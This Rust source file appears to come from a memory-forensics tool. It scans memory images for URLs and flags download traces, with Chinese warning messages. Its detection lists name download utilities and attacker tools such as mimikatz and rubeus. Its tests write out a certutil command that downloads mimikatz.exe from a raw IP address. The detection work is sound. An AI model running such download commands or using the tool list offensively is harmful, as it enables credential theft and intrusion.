use std::collections::BTreeMap;
use std::net::IpAddr;

use anyhow::{Result, ensure};
use serde::Serialize;

use crate::image::MemoryImage;
use crate::scan::scan_patterns;

const DEFAULT_CHUNK_SIZE: usize = 64 * 1024 * 1024;
const CONTEXT_BEFORE: u64 = 512;
const CONTEXT_AFTER: u64 = 1536;
const MAX_EVIDENCE_CHARS: usize = 320;

const URL_PATTERNS: [&[u8]; 4] = [
    b"http://",
    b"https://",
    b"h\0t\0t\0p\0:\0/\0/\0",
    b"h\0t\0t\0p\0s\0:\0/\0/\0",
];

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize)]
#[serde(rename_all = "snake_case")]
pub enum DownloadTextEncoding {
    Ascii,
    Utf16Le,
}

#[derive(Debug, Clone, Serialize)]
pub struct DownloadOwner {
    pub pid: u64,
    pub process: String,
    pub browser: String,
    pub virtual_address: u64,
}

#[derive(Debug, Clone, Serialize)]
pub struct DownloadTraceRecord {
    pub url: String,
    pub host: String,
    pub ip_address: Option<String>,
    pub port: Option<u16>,
    pub file_name: Option<String>,
    pub method: Option<String>,
    pub confidence: String,
    pub encodings: Vec<DownloadTextEncoding>,
    pub occurrences: usize,
    pub physical_addresses: Vec<u64>,
    pub owners: Vec<DownloadOwner>,
    pub evidence: String,
}

#[derive(Debug, Serialize)]
pub struct DownloadScanReport {
    pub records: Vec<DownloadTraceRecord>,
    pub complete: bool,
    pub raw_url_hits: usize,
    pub bytes_scanned: u64,
    pub scan_seconds: f64,
    pub scan_gib_per_second: f64,
    pub warnings: Vec<String>,
}

pub fn scan_download_traces(image: &MemoryImage, limit: usize) -> Result<DownloadScanReport> {
    ensure!(limit > 0, "download result limit must be greater than zero");
    let raw_limit = limit.saturating_mul(256).clamp(250_000, 1_000_000);
    let scan = scan_patterns(image, &URL_PATTERNS, raw_limit, DEFAULT_CHUNK_SIZE)?;
    let raw_url_hits = scan.hits.len();
    let mut records: BTreeMap<String, DownloadTraceRecord> = BTreeMap::new();

    for hit in &scan.hits {
        let encoding = if hit.pattern_index < 2 {
            DownloadTextEncoding::Ascii
        } else {
            DownloadTextEncoding::Utf16Le
        };
        let Some((bytes, hit_offset)) = read_context(image, hit.physical_address) else {
            continue;
        };
        let Some(url) = extract_url(&bytes, hit_offset, encoding) else {
            continue;
        };
        let evidence = decode_evidence(&bytes, hit_offset, encoding, &url);
        let method = identify_download_method(&evidence);
        let file_name = url_file_name(&url);
        let payload = looks_like_payload(&url, file_name.as_deref());
        if method.is_none() && !payload {
            continue;
        }
        let Some((host, port)) = parse_url_endpoint(&url) else {
            continue;
        };
        if !plausible_host(&host) {
            continue;
        }
        let ip_address = host.parse::<IpAddr>().ok().map(|ip| ip.to_string());
        let confidence = if method.is_some() && payload {
            "high"
        } else {
            "medium"
        };
        let key = url.to_ascii_lowercase();
        let entry = records.entry(key).or_insert_with(|| DownloadTraceRecord {
            url: url.clone(),
            host,
            ip_address,
            port,
            file_name,
            method: method.clone(),
            confidence: confidence.to_owned(),
            encodings: Vec::new(),
            occurrences: 0,
            physical_addresses: Vec::new(),
            owners: Vec::new(),
            evidence: evidence.clone(),
        });
        entry.occurrences += 1;
        if !entry.encodings.contains(&encoding) {
            entry.encodings.push(encoding);
        }
        if entry.physical_addresses.len() < 32 {
            entry.physical_addresses.push(hit.physical_address);
        }
        if entry.method.is_none() && method.is_some() {
            entry.method = method;
            entry.confidence = confidence.to_owned();
            entry.evidence = evidence;
        } else if evidence_quality(&evidence) > evidence_quality(&entry.evidence) {
            entry.evidence = evidence;
        }
    }

    let mut records: Vec<DownloadTraceRecord> = records.into_values().collect();
    records.sort_unstable_by(|left, right| {
        confidence_rank(&right.confidence)
            .cmp(&confidence_rank(&left.confidence))
            .then_with(|| right.occurrences.cmp(&left.occurrences))
            .then_with(|| left.url.cmp(&right.url))
    });
    let records_truncated = records.len() > limit;
    records.truncate(limit);
    let mut warnings = Vec::new();
    if scan.truncated {
        warnings.push("URL 原始命中达到安全上限，报告可能不完整".to_owned());
    }
    if records_truncated {
        warnings.push(format!("下载痕迹结果达到 {limit} 条上限"));
    }
    Ok(DownloadScanReport {
        complete: !scan.truncated && !records_truncated,
        records,
        raw_url_hits,
        bytes_scanned: scan.bytes_scanned,
        scan_seconds: scan.elapsed_seconds,
        scan_gib_per_second: scan.gib_per_second,
        warnings,
    })
}

fn read_context(image: &MemoryImage, address: u64) -> Option<(Vec<u8>, usize)> {
    let span = image
        .spans()
        .iter()
        .find(|span| address >= span.start && address < span.end())?;
    let start = address.saturating_sub(CONTEXT_BEFORE).max(span.start);
    let end = address.saturating_add(CONTEXT_AFTER).min(span.end());
    let mut bytes = vec![0u8; usize::try_from(end.checked_sub(start)?).ok()?];
    image.read_physical(start, &mut bytes).ok()?;
    Some((bytes, usize::try_from(address - start).ok()?))
}

fn extract_url(bytes: &[u8], offset: usize, encoding: DownloadTextEncoding) -> Option<String> {
    match encoding {
        DownloadTextEncoding::Ascii => extract_ascii_url(bytes.get(offset..)?),
        DownloadTextEncoding::Utf16Le => extract_utf16_url(bytes.get(offset..)?),
    }
}

fn extract_ascii_url(bytes: &[u8]) -> Option<String> {
    let end = bytes
        .iter()
        .position(|byte| !is_url_byte(*byte))
        .unwrap_or(bytes.len())
        .min(4096);
    let value = std::str::from_utf8(bytes.get(..end)?).ok()?;
    normalize_url(value)
}

fn extract_utf16_url(bytes: &[u8]) -> Option<String> {
    let mut units = Vec::new();
    for pair in bytes.chunks_exact(2).take(2048) {
        let unit = u16::from_le_bytes([pair[0], pair[1]]);
        if unit > 0x7f || !is_url_byte(unit as u8) {
            break;
        }
        units.push(unit);
    }
    let value = String::from_utf16(&units).ok()?;
    normalize_url(&value)
}

fn is_http_url(value: &str) -> bool {
    value.starts_with("http://") || value.starts_with("https://")
}

fn is_url_byte(byte: u8) -> bool {
    (0x21..=0x7e).contains(&byte) && !matches!(byte, b'"' | b'\'' | b'<' | b'>' | b',' | b'`')
}

fn normalize_url(value: &str) -> Option<String> {
    if !is_http_url(value) {
        return None;
    }
    let nested = ["http://", "https://"]
        .into_iter()
        .filter_map(|scheme| value[1..].find(scheme).map(|offset| offset + 1))
        .min()
        .unwrap_or(value.len());
    let value = value[..nested]
        .trim_end_matches(['.', ';', ':', ')', ']', '}'])
        .to_owned();
    is_http_url(&value).then_some(value)
}

fn decode_evidence(
    bytes: &[u8],
    hit_offset: usize,
    encoding: DownloadTextEncoding,
    url: &str,
) -> String {
    let decoded = match encoding {
        DownloadTextEncoding::Ascii => {
            let start = bytes[..hit_offset.min(bytes.len())]
                .iter()
                .rposition(|byte| !is_evidence_ascii_byte(*byte))
                .map_or(0, |index| index + 1);
            let end = bytes[hit_offset.min(bytes.len())..]
                .iter()
                .position(|byte| !is_evidence_ascii_byte(*byte))
                .map_or(bytes.len(), |index| hit_offset + index);
            String::from_utf8_lossy(&bytes[start..end]).into_owned()
        }
        DownloadTextEncoding::Utf16Le => {
            let units: Vec<u16> = bytes
                .chunks_exact(2)
                .map(|pair| u16::from_le_bytes([pair[0], pair[1]]))
                .collect();
            let hit_unit = (hit_offset / 2).min(units.len());
            let start = units[..hit_unit]
                .iter()
                .rposition(|unit| *unit == 0)
                .map_or(0, |index| index + 1);
            let end = units[hit_unit..]
                .iter()
                .position(|unit| *unit == 0)
                .map_or(units.len(), |index| hit_unit + index);
            String::from_utf16_lossy(&units[start..end])
                .chars()
                .map(|character| {
                    if character.is_control() || character == '\u{fffd}' {
                        ' '
                    } else {
                        character
                    }
                })
                .collect()
        }
    };
    let normalized = decoded.split_whitespace().collect::<Vec<_>>().join(" ");
    focused_excerpt(&normalized, url, MAX_EVIDENCE_CHARS)
}

fn is_evidence_ascii_byte(byte: u8) -> bool {
    matches!(byte, b'\t' | b'\r' | b'\n' | 0x20..=0x7e)
}

fn focused_excerpt(text: &str, needle: &str, max_chars: usize) -> String {
    let characters: Vec<char> = text.chars().collect();
    let Some(byte_offset) = text.find(needle) else {
        return characters.into_iter().take(max_chars).collect();
    };
    let url_character = text[..byte_offset].chars().count();
    let command_character = find_download_token(text)
        .filter(|offset| *offset <= byte_offset)
        .map(|offset| text[..offset].chars().count());
    let start =
        command_character.unwrap_or_else(|| url_character.saturating_sub(max_chars * 3 / 5));
    let end = (start + max_chars).min(characters.len());
    characters[start..end].iter().collect()
}

fn identify_download_method(evidence: &str) -> Option<String> {
    let lower = evidence.to_ascii_lowercase();
    [
        ("certutil", "certutil"),
        ("invoke-webrequest", "powershell_invoke_webrequest"),
        ("downloadfile", "powershell_webclient"),
        ("downloadstring", "powershell_webclient"),
        ("start-bitstransfer", "bits"),
        ("bitsadmin", "bits"),
        ("curl", "curl"),
        ("wget", "wget"),
    ]
    .into_iter()
    .find_map(|(needle, method)| contains_command_token(&lower, needle).then(|| method.to_owned()))
}

fn contains_command_token(text: &str, needle: &str) -> bool {
    find_command_token(text, needle).is_some()
}

fn find_download_token(text: &str) -> Option<usize> {
    let lower = text.to_ascii_lowercase();
    [
        "certutil",
        "invoke-webrequest",
        "downloadfile",
        "downloadstring",
        "start-bitstransfer",
        "bitsadmin",
        "curl",
        "wget",
    ]
    .into_iter()
    .find_map(|needle| find_command_token(&lower, needle))
}

fn find_command_token(text: &str, needle: &str) -> Option<usize> {
    text.match_indices(needle).find_map(|(start, _)| {
        let before = text[..start].chars().next_back();
        let after = text[start + needle.len()..].chars().next();
        (before.is_none_or(|character| !character.is_ascii_alphanumeric() && character != '_')
            && after.is_none_or(|character| {
                !character.is_ascii_alphanumeric() && character != '_' && character != '-'
            }))
        .then_some(start)
    })
}

fn looks_like_payload(url: &str, file_name: Option<&str>) -> bool {
    let lower = url.to_ascii_lowercase();
    let payload_name = file_name.unwrap_or_default().to_ascii_lowercase();
    [
        ".exe", ".dll", ".sys", ".msi", ".ps1", ".bat", ".cmd", ".vbs", ".scr", ".com", ".zip",
        ".rar", ".7z",
    ]
    .iter()
    .any(|extension| payload_name.ends_with(extension))
        || [
            "mimikatz",
            "psexec",
            "procdump",
            "netcat",
            "chisel",
            "rubeus",
            "bloodhound",
            "lazagne",
        ]
        .iter()
        .any(|keyword| lower.contains(keyword))
}

fn parse_url_endpoint(url: &str) -> Option<(String, Option<u16>)> {
    let authority = url.split_once("://")?.1.split(['/', '?', '#']).next()?;
    let authority = authority.rsplit('@').next()?;
    if let Some(rest) = authority.strip_prefix('[') {
        let end = rest.find(']')?;
        let host = rest[..end].to_owned();
        let port = rest[end + 1..]
            .strip_prefix(':')
            .and_then(|value| value.parse().ok());
        return Some((host, port));
    }
    let (host, port) = authority
        .rsplit_once(':')
        .filter(|(_, value)| value.chars().all(|character| character.is_ascii_digit()))
        .map(|(host, value)| (host, value.parse().ok()))
        .unwrap_or((authority, None));
    (!host.is_empty()).then(|| (host.to_owned(), port))
}

fn plausible_host(host: &str) -> bool {
    if host.parse::<IpAddr>().is_ok() {
        return true;
    }
    host.len() <= 253
        && host.contains('.')
        && host.split('.').all(|label| {
            !label.is_empty()
                && label.len() <= 63
                && !label.starts_with('-')
                && !label.ends_with('-')
                && label
                    .bytes()
                    .all(|byte| byte.is_ascii_alphanumeric() || byte == b'-')
        })
}

fn url_file_name(url: &str) -> Option<String> {
    let path = url
        .split_once("://")?
        .1
        .split_once('/')
        .map(|(_, path)| path)?;
    let name = path.split(['?', '#']).next()?.rsplit('/').next()?;
    (!name.is_empty()).then(|| name.to_owned())
}

fn evidence_quality(evidence: &str) -> i64 {
    let repeated_non_ascii = evidence
        .chars()
        .zip(evidence.chars().skip(1))
        .filter(|(left, right)| left == right && !left.is_ascii() && !left.is_whitespace())
        .count() as i64;
    i64::from(identify_download_method(evidence).is_some()) * 10_000
        + evidence.chars().count() as i64
        - repeated_non_ascii * 64
}

fn confidence_rank(confidence: &str) -> usize {
    match confidence {
        "high" => 2,
        "medium" => 1,
        _ => 0,
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn extracts_ascii_and_utf16_download_urls() {
        let url = "http://155.94.204.67:85/mimikatz.exe";
        assert_eq!(
            extract_ascii_url(format!("{url} next").as_bytes()).as_deref(),
            Some(url)
        );
        let utf16: Vec<u8> = format!("{url}\0尾部")
            .encode_utf16()
            .flat_map(u16::to_le_bytes)
            .collect();
        assert_eq!(extract_utf16_url(&utf16).as_deref(), Some(url));
        assert_eq!(
            extract_ascii_url(b"http://one.test/a.exe,https://two.test/b.exe ").as_deref(),
            Some("http://one.test/a.exe")
        );
        assert_eq!(
            extract_ascii_url(b"http://one.test/a.exehttps://two.test/b.exe ").as_deref(),
            Some("http://one.test/a.exe")
        );
    }

    #[test]
    fn parses_ip_port_payload_and_download_method() {
        let url = "http://155.94.204.67:85/mimikatz.exe";
        assert_eq!(
            parse_url_endpoint(url),
            Some(("155.94.204.67".to_owned(), Some(85)))
        );
        assert_eq!(url_file_name(url).as_deref(), Some("mimikatz.exe"));
        assert!(looks_like_payload(url, Some("mimikatz.exe")));
        assert_eq!(
            identify_download_method(&format!("certutil -urlcache -f {url}")).as_deref(),
            Some("certutil")
        );
        assert!(identify_download_method("PKCUrl http://example.test").is_none());
        assert!(identify_download_method("_wgetenv is a runtime symbol").is_none());
        assert!(plausible_host("155.94.204.67"));
        assert!(plausible_host("download.example.test"));
        assert!(!plausible_host("www.example.test,https"));
        assert!(
            evidence_quality("certutil 命令成功完成")
                > evidence_quality("certutil 命命令令成成功功完完成成")
        );
    }
}
